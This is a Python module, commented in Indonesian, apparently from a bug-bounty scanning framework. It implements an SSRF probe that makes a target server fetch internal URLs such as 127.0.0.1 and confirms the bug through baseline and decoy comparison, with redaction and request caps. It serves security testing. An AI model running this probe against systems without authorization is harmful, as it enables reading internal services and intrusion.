"""ssrf_chain — SSRF dari pingback ke BUKTI body service internal
(CWE-918, critical).

Perbedaan dengan ssrf_oob: di sini buktinya KONTEN — server produksi
mengambil URL pilihan peneliti (target internal dari args) dan MENAMPILKAN
bagian dari responsnya ke peneliti. Pelajaran BINUS: pingback/content-blind
tidak di-claim; yang di-claim = body yang terbaca.

Differential + FP-guard:
  - baseline : request tanpa parameter -> simpan body;
  - decoy    : 1 request ke URL dummy (cyphron-decoy.invalid) — bila body
               ikut "berubah signifikan", aplikasi hanya echo/fetch semua
               input -> BUKAN bukti (guard menolak);
  - probe    : target internal (127.0.0.1, host internal dari args) ->
               bukti = konten baru (tidak ada di baseline & decoy),
               panjang >= 80 char, dan tidak mengandung URL yang dikirim
               (guard echo).
Cease-on-data: konten internal yang mengandung kredensial direndaksi
(maks 120 char excerpt); tidak ada pivot lanjutan ke service lain.
"""

from __future__ import annotations

from urllib.parse import quote as _q, urljoin

from . import http_engine
from .base import Tool, ToolContext, ToolResult, redact
from ..findings import Finding

_DECOY = "http://cyphron-decoy.invalid/ssrf-chain"


def _new_content(probe_body: str, *against: str) -> str:
    """Kembalikan 'baris konten' probe yang tidak ada di semua pembanding."""
    known = set()
    for a in against:
        known.update(a.splitlines())
        known.add(a[:200])
    fresh = [ln.strip() for ln in probe_body.splitlines()
             if ln.strip() and ln.strip() not in known]
    return "\n".join(fresh)


class SsrfChainTool(Tool):
    name = "ssrf_chain"
    description = ("SSRF dengan bukti body internal (bukan pingback buta): "
                   "decoy anti-echo + differential konten + redaksi kredensial.")
    risk_tags = {"active"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args.get("url") or "").rstrip("/")
        param = str(args.get("param") or "url")
        internal = [t for t in (args.get("internal_targets") or
                                ["http://127.0.0.1/", "http://localhost/"])][:4]
        if "{payload}" not in base and not internal:
            return ToolResult(tool=self.name, ok=False,
                              error="args.url + param wajib; internal_targets "
                                    "dari intel/chains (jangan menebak-nembak)")

        def probe_for(target: str) -> str:
            u = base.replace("{payload}", _q(target, safe="")) \
                if "{payload}" in base else \
                urljoin(base + "/", ("?" if "?" not in base else "&") +
                        f"{param}={_q(target, safe='')}")
            return u

        # ---- baseline
        b_url = probe_for("https://baseline-cyphron.invalid/")
        ctx.throttle()
        b_st, _h, b_body, _ms = http_engine.http_get(b_url, timeout=ctx.timeout_s)
        ctx.world.request_count += 1
        data: dict = {"param": param, "baseline_status": b_st, "probes": []}

        # ---- decoy (FP-guard echo/fetch-all)
        ctx.throttle()
        d_st, _h, d_body, _ms = http_engine.http_get(
            probe_for(_DECOY), timeout=ctx.timeout_s)
        ctx.world.request_count += 1
        decoy_fresh = _new_content(d_body, b_body)
        data["decoy"] = {"status": d_st, "fresh_len": len(decoy_fresh)}
        echo_like = len(decoy_fresh) >= 80 and _DECOY.split("//")[1].split("/")[0] \
            not in d_body

        findings: list[Finding] = []
        for target in internal:
            if ctx.world.request_count >= ctx.max_requests or findings:
                break  # cease-on-data
            ctx.throttle()
            try:
                st, _h, body, _ms = http_engine.http_get(
                    probe_for(target), timeout=ctx.timeout_s)
            except Exception as e:
                data["probes"].append({"target": target,
                                       "error": type(e).__name__})
                continue
            ctx.world.request_count += 1
            fresh = _new_content(body, b_body, d_body)
            echoed = target.split("//")[1].split("/")[0] in body
            data["probes"].append({"target": target, "status": st,
                                   "fresh_len": len(fresh), "echoed": echoed})
            if len(fresh) < 80 or echoed:
                continue
            excerpt = redact(fresh[:120])
            findings.append(Finding(
                tool=self.name,
                title=f"SSRF reads internal service body via '{param}' "
                      f"(target {target})",
                severity="critical", cwe="CWE-918",
                description=(
                    f"Server produksi mengambil URL internal '{target}' dari "
                    f"parameter '{param}' dan MENAMPILKAN sebagian isinya ke "
                    f"klien — SSRF bukan hanya pingback tapi pembacaan konten "
                    f"service internal (kesimpulan layanan dari konten). "
                    f"Guard: decoy eksternal dummy TIDAK menghasilkan konten "
                    f"banyak {'(server echo semua input -> guard menolak)' if echo_like else ''}, "
                    f"konten bukti tidak ada di baseline. cease-on-data: tidak "
                    f"ada pivot ke service internal lain."),
                recommendation=(
                    "Allowlist tujuan fetch (deny RFC1918/link-local/metadata), "
                    "jangan render body URL input mentah, disable follow "
                    "redirect, dan segmentasikan jaringan."),
                target_url=base, param=param,
                request=f"GET ...?{param}={target}",
                response=f"status={st}; konten internal baru "
                         f"({len(fresh)} chars): {excerpt!r}",
                confidence=0.85, source_skill=self.source_skill,
                status="confirmed", evidence_kind="probe-triplet"))
        return ToolResult(tool=self.name, ok=True, data=data, findings=findings)
